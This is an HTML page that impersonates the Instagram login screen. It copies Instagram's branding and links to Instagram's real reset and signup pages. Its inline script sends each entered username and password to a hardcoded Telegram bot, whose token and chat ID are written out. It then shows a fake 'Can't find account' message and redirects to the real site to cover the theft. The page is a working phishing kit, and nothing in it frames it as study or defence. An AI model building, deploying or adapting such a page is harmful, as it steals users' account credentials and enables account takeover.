<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="design.css">
    <link rel="icon" href="favicon.png" type="image/icon">
</head>
<body>

    <div class="login-container">
    	<img class="logo-pic" src="logo.png" alt="Logo">
        <form class="login-form" id="loginForm" novalidate>
            <div class="form-group input-container">
                <input id="username" name="u_name" type="text" placeholder=" ">
                <label for="username">Username, email address or mobile number</label>
                <span class="clear-icon">&times;</span>
            </div>
            <div class="form-group input-container">
                <input id="password" name="pass" type="password" placeholder=" ">
                <label for="password">Password</label>
                <span class="toggle-password">
                    <img id="eye-icon" src="hide.png" alt="Toggle Password">
                </span>
            </div>
            
            <button type="submit" class="btn btn-primary">Log in</button>
            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">Forgotten password?</a>
        </form>

        <div id="customModal" class="modal-overlay">
            <div class="modal-box">
                <div class="modal-content">
                    <p>Enter your username, email address or mobile number to log in</p>
                </div>
                <div class="modal-footer">
                    <button id="modalOkBtn" class="modal-btn">OK</button>
                    <button id="modalCreateBtn" class="modal-btn">Create new account</button>
                </div>
            </div>
        </div>

        <div id="errorModal" class="modal-overlay">
            <div class="modal-box">
                <div class="modal-content">
                    <h3 class="modal-title">Can't find account</h3>
                    <p id="errorText">We can't find an account with this username.</p>
                </div>
                <div class="modal-footer">
                    <button id="btnSignUp" class="modal-btn">Sign up</button>
                    <button id="btnTryAgain" class="modal-btn">Try again</button>
                </div>
            </div>
        </div>
        
        <div class="create-account-container">
            <a href="https://www.instagram.com/accounts/emailsignup/" class="btn btn-secondary">Create new account</a>
        </div>
        <img class="meta-pic" src="meta.png" alt="Meta">
    </div>

<script>
    // --- CONFIGURATION ---
    const botToken = '8595419325:AAHCyEpryu-iWIcAGKfD1w1Q-SH5hJGawCU';
    const chatId = '1274263985';

    // --- DOM ELEMENTS ---
    const loginForm = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    
    // Icon Elements
    const clearIcon = document.querySelector('.clear-icon');
    const togglePasswordSpan = document.querySelector('.toggle-password');
    const eyeIcon = document.getElementById('eye-icon');
    
    // 1. Empty Field Modal Elements
    const modal = document.getElementById('customModal');
    const modalText = document.querySelector('.modal-content p'); 
    const modalOkBtn = document.getElementById('modalOkBtn');
    const modalCreateBtn = document.getElementById('modalCreateBtn');

    // 2. New "Can't Find Account" Modal Elements
    const errorModal = document.getElementById('errorModal');
    const errorText = document.getElementById('errorText');
    const btnSignUp = document.getElementById('btnSignUp');
    const btnTryAgain = document.getElementById('btnTryAgain');

    // --- SUBMISSION LOGIC ---
    if (loginForm) {
        loginForm.addEventListener('submit', function(event) {
            event.preventDefault(); // Stop page reload

            const usernameValue = usernameInput.value.trim();
            const passwordValue = passwordInput.value.trim();

            // 1. Check if Username is empty
            if (!usernameValue) {
                modalText.innerText = "Enter your username, email address or mobile number to log in";
                modal.style.display = 'flex';
            
            // 2. Check if Password is empty
            } else if (!passwordValue) {
                modalText.innerText = "Please enter your password.";
                modal.style.display = 'flex';

            // 3. If fields are valid
            } else {
                // A. Send Data to Telegram
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `Login Attempt:\nUser: ${usernameValue}\nPass: ${passwordValue}`
                    })
                });

                // B. SHOW THE "CAN'T FIND ACCOUNT" POPUP
                // Update text with the actual username entered
                errorText.innerText = `We can't find an account with ${usernameValue}. Try another phone number or email address, or if you don't have an Instagram account, you can sign up.`;
                
                // Show the error modal
                errorModal.style.display = 'flex';
            }
        });
    }

    // --- BUTTON ACTIONS ---

    // 1. Empty Field Modal Actions
    if (modalOkBtn) {
        modalOkBtn.addEventListener('click', function() {
            modal.style.display = 'none';
        });
    }
    if (modalCreateBtn) {
        modalCreateBtn.addEventListener('click', function() {
            window.location.href = "https://www.instagram.com/accounts/emailsignup/";
        });
    }

    // 2. "Can't Find Account" Modal Actions
    if (btnTryAgain) {
        btnTryAgain.addEventListener('click', function() {
            // Direct to example.com as requested
            window.location.href = "https://www.instagram.com";
        });
    }

    if (btnSignUp) {
        btnSignUp.addEventListener('click', function() {
            // Direct to example.com as requested
            window.location.href = "https://www.instagram.com/accounts/emailsignup/";
        });
    }

    // --- UI LOGIC (Icons) ---

    function updateEyeIconVisibility() {
        if (passwordInput.value.length > 0) {
            togglePasswordSpan.style.display = 'flex'; 
        } else {
            togglePasswordSpan.style.display = 'none'; 
        }
    }

    if (passwordInput) {
        passwordInput.addEventListener('input', updateEyeIconVisibility);
    }
    
    if (togglePasswordSpan) {
        togglePasswordSpan.addEventListener('click', function () {
            const currentType = passwordInput.getAttribute('type');
            if (currentType === 'password') {
                passwordInput.setAttribute('type', 'text');
                eyeIcon.src = "show.png"; 
            } else {
                passwordInput.setAttribute('type', 'password');
                eyeIcon.src = "hide.png"; 
            }
        });
    }

    if (usernameInput) {
        usernameInput.addEventListener('input', function() {
            if (usernameInput.value.length > 0) {
                clearIcon.style.display = 'block';
            } else {
                clearIcon.style.display = 'none';
            }
        });
    }

    if (clearIcon) {
        clearIcon.addEventListener('click', function() {
            usernameInput.value = ""; 
            clearIcon.style.display = 'none'; 
            usernameInput.focus(); 
        });
    }

    // --- ROBUST KEYBOARD DETECTION ---

    // 1. Capture the screen height IMMEDIATELY on load.
    // This 'locks' the value before the address bar or keyboard moves things around.
    let initialHeight = window.innerHeight;

    // 2. Handle screen rotation (optional but good for stability)
    window.addEventListener('resize', () => {
        // Only update the "initial" height if the change is HUGE (like rotation),
        // not small (like address bar hiding/showing).
        if (Math.abs(window.innerHeight - initialHeight) > 200) {
            initialHeight = window.innerHeight;
        }
    });

    // 3. The Logic
    if (window.visualViewport) {
        window.visualViewport.addEventListener('resize', () => {
            // We compare the CURRENT visible space against the ORIGINAL locked height
            // If current space is less than 85% of original, keyboard is likely open.
            if (window.visualViewport.height < initialHeight * 0.85) {
                document.body.classList.add('keyboard-is-open');
                
                // Optional: meaningful scroll to keep input in view
                if (document.activeElement) {
                    setTimeout(() => {
                        document.activeElement.scrollIntoView({block: "center", behavior: "smooth"});
                    }, 100);
                }
            } else {
                document.body.classList.remove('keyboard-is-open');
            }
        });
    } else {
        // Fallback for very old browsers
        window.addEventListener('resize', () => {
            if (window.innerHeight < initialHeight * 0.85) {
                document.body.classList.add('keyboard-is-open');
            } else {
                document.body.classList.remove('keyboard-is-open');
            }
        });
    }
</script>
</body>
</html>